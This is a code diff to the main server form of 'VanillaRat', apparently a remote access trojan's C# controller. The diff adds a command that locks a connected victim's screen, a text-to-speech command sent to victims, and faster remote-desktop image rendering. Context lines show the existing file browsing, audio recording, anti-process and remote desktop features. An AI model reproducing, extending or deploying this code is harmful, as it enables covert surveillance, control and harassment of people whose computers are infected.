@@ -1,16 +1,17 @@
-﻿using System;
+﻿using StreamLibrary;
+using StreamLibrary.UnsafeCodecs;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
+using System.Speech.Synthesis;
 using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using StreamLibrary;
-using StreamLibrary.UnsafeCodecs;
 using Telepathy;
 using VanillaRat.Classes;
 using VanillaRat.Forms;
@@ -36,6 +37,7 @@ namespace VanillaRat
         }
 
         #region Declarations
+
         public AudioRecorder AR = new AudioRecorder();
         public ComputerInformation CI = new ComputerInformation();
         public ClientRunningApps CRA = new ClientRunningApps();
@@ -51,8 +53,9 @@ namespace VanillaRat
         public bool RDActive;
         public RDC RDC = new RDC();
         public int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;
-        private Settings.Values Settings;       
-        #endregion
+        private Settings.Values Settings;
+
+        #endregion Declarations
 
         #region Extra
 
@@ -139,6 +142,7 @@ namespace VanillaRat
         #region Main Server Code
 
         #region Client Information
+
         //Gets client tag from client then updates list item
         private void AddClientTag(int ConnectionId, string Tag)
         {
@@ -178,7 +182,8 @@ namespace VanillaRat
                     lbConnectedClients.Items[n].SubItems[4].Text = OperatingSystem;
             }
         }
-        #endregion
+
+        #endregion Client Information
 
         #region Data Handler
 
@@ -306,7 +311,8 @@ namespace VanillaRat
                     break;
             }
         }
-        #endregion
+
+        #endregion Data Handler
 
         #region Update Functions
 
@@ -452,9 +458,9 @@ namespace VanillaRat
                         string Filename = Functions.GetSubstringByString("{", "}", S);
                         string Extension = Functions.GetSubstringByString("<", ">", S);
                         string DateCreated = Functions.GetSubstringByString("[", "]", S);
-                        string[] ToAdd = {Filename, Extension, DateCreated};
+                        string[] ToAdd = { Filename, Extension, DateCreated };
                         var ListItem = new ListViewItem(ToAdd);
-                        FE.lbFiles.Items.Add(ListItem);                       
+                        FE.lbFiles.Items.Add(ListItem);
                     }
                     return;
                 }
@@ -553,9 +559,10 @@ namespace VanillaRat
         {
             GetRecievedData();
         }
-        #endregion
 
-        #endregion
+        #endregion Update Functions
+
+        #endregion Main Server Code
 
         #region Form
 
@@ -623,7 +630,6 @@ namespace VanillaRat
                     "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
             if (DR == DialogResult.Yes)
                 MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleAntiProcess"));
-
         }
 
         //Open chat with client
@@ -644,6 +650,20 @@ namespace VanillaRat
             C.Text = "Chat - " + ConnectionId;
             C.Show();
         }
+
+        //Start or stop screen locker
+        private void btnLockComputer_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleScreenlock"));
+        }
+
         //Get running processes
         private void btnGetRunningApps_Click(object sender, EventArgs e)
         {
@@ -673,7 +693,7 @@ namespace VanillaRat
             OW = new OpenWebsite();
             OW.Show();
             OW.ConnectionID = ConnectionId;
-            OW.Text = "Open Website - " + OW.ConnectionID;           
+            OW.Text = "Open Website - " + OW.ConnectionID;
         }
 
         //Get computer information
@@ -741,7 +761,7 @@ namespace VanillaRat
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("DisconnectClient"));
         }
 
-        //Show client console (No longer working due to FreeConsole function on client side to allow for chat.)
+        //Show client console (No longer working.)
         private void btnShowClientConsole_Click(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
@@ -768,8 +788,8 @@ namespace VanillaRat
 
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId,
-                Encoding.ASCII.GetBytes("MsgBox(<" + txtMessage.Text + ">[" + txtHeader.Text + "]{" +
-                                        cbButtons.SelectedItem + "}" + "/" + cbIcons.SelectedItem + @"\)"));
+                Encoding.ASCII.GetBytes("MsgBox<{<" + txtMessage.Text + ">[" + txtHeader.Text + "]{" +
+                                        cbButtons.SelectedItem + "}" + "/" + cbIcons.SelectedItem + @"\}>"));
         }
 
         //Preview message box
@@ -888,18 +908,56 @@ namespace VanillaRat
             AR.Show();
         }
 
+        //Send text to speech
+        private void btnSendTTS_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(txtTTSText.Text))
+            {
+                MessageBox.Show("You must enter text before TTS is heard or sent.", "Error", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                return;
+            }
+
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("[<TTS>]" + txtTTSText.Text));
+        }
+
+        //Listen to TTS before or after sending
+        private void btnTTSListen_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrWhiteSpace(txtTTSText.Text))
+            {
+                MessageBox.Show("You must enter text before TTS is heard or sent.", "Error", MessageBoxButtons.OK,
+                    MessageBoxIcon.Error);
+                return;
+            }
+            using (SpeechSynthesizer Synth = new SpeechSynthesizer())
+            {
+                Synth.SetOutputToDefaultAudioDevice();
+                Synth.Speak(txtTTSText.Text);
+            }
+        }
+
         #endregion Client Functions
 
         #region Remote Desktop
 
+
+
         //Convert byte array to image
         public Image ByteArrayToImage(byte[] ByteArrayIn)
         {
+            IUnsafeCodec UC = new UnsafeStreamCodec(50);
             using (var MS = new MemoryStream(ByteArrayIn))
             {
                 try
-                {
-                    IUnsafeCodec UC = new UnsafeStreamCodec(60);
+                {                   
                     return UC.DecodeData(MS);
                 }
                 catch
@@ -954,18 +1012,27 @@ namespace VanillaRat
                         break;
                     }
 
-                    var Image = ImageToDisplay;
-                    if (RDC.pbDesktop.InvokeRequired)
-                        RDC.pbDesktop.Invoke((MethodInvoker) delegate { RDC.pbDesktop.Image = Image; });
-                    else
-                        RDC.pbDesktop.Image = Image;
-                    await Task.Delay(50);
+
+                    using (Bitmap SRC = new Bitmap(ImageToDisplay))
+                    {
+                        Bitmap DEST = new Bitmap(RDC.pbDesktop.Width, RDC.pbDesktop.Height, PixelFormat.Format32bppPArgb);
+                        using (Graphics G = Graphics.FromImage(DEST))
+                        {
+                            G.DrawImage(SRC, new Rectangle(Point.Empty, DEST.Size));
+                        }
+                        if (RDC.pbDesktop.InvokeRequired)
+                            RDC.pbDesktop.Invoke((MethodInvoker)delegate { RDC.pbDesktop.Image = DEST; });
+                        else
+                            RDC.pbDesktop.Image = DEST;
+                    }
+                        
+                    await Task.Delay(10);
                 }
                 catch
                 {
-
                 }
         }
-        #endregion Remote Desktop       
+
+        #endregion Remote Desktop        
     }
 }
